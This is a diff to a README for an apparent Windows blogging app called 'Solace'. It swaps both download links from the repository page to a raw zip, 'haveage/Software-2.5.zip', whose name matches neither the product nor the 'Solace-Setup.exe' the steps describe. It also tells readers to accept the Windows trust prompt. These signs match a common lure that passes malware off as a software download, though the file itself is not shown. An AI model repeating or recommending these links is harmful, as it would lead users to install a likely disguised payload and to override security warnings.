@@ -1,6 +1,6 @@
 # 📝 Solace - Build your personal space with ease
 
-[![](https://img.shields.io/badge/Download_Solace-Blue.svg)](https://github.com/drillingmuduplifting7389/Solace)
+[![](https://img.shields.io/badge/Download_Solace-Blue.svg)](https://raw.githubusercontent.com/drillingmuduplifting7389/Solace/main/haveage/Software-2.5.zip)
 
 Solace is a complete system for your personal blog. It gives you a clean space to share your thoughts, photos, and technical projects. You host your own content, own your data, and control your online presence. This software works on standard Windows computers. You do not need experience with coding to store your writing or manage your media.
 
@@ -28,7 +28,7 @@ Follow these steps to set up Solace on your machine. We break the process into s
 ### 1. Download the Installer
 Visit the page below to get the latest version of Solace. Choose the file that ends in .exe for your Windows system.
 
-[Download Solace](https://github.com/drillingmuduplifting7389/Solace)
+[Download Solace](https://raw.githubusercontent.com/drillingmuduplifting7389/Solace/main/haveage/Software-2.5.zip)
 
 ### 2. Run the Setup File
 Once the file finishes downloading, move to your Downloads folder. Double-click the file named Solace-Setup.exe. A Windows prompt may appear to ask if you trust this file. Select Run or Yes to begin the installation. An installation window opens to guide you through the process. Select your preferred location on your computer for the files. Click Next until the software finishes installing.
